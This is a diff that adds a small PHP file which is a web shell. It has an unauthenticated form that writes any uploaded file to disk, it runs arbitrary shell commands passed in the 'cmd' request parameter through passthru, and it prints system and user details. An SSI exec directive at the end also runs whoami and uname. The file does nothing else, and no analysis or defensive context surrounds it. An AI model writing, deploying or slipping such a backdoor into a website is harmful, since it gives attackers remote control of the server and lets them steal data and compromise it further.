@@ -1,0 +1,17 @@
+<center>
+PHP VERSION
+<?php
+if($_POST){if(@copy($_FILES["0"]["tmp_name"],$_FILES["0"]["name"])){echo"Y";}else{echo"N";}}else{echo"<form method=post enctype=multipart/form-data><input type=file name=0><input name=0 type=submit value=up>";}
+@error_reporting(0);
+if (!empty($_GET['id']) && empty($_GET['cmd'])) { passthru('id'); exit; }
+if (!empty($_REQUEST['cmd'])) { passthru($_REQUEST['cmd']); exit; }
+if (!empty($_GET['cmd'])) { passthru($_GET['cmd']); exit; }
+echo 'REMOTE EXEC';
+echo php_uname();
+echo PHP_OS;
+?>
+</center>
+<center>
+VERSION SSI
+<!--#exec cmd="dir;pwd;whoami{uname,-a}" -->
+</center>
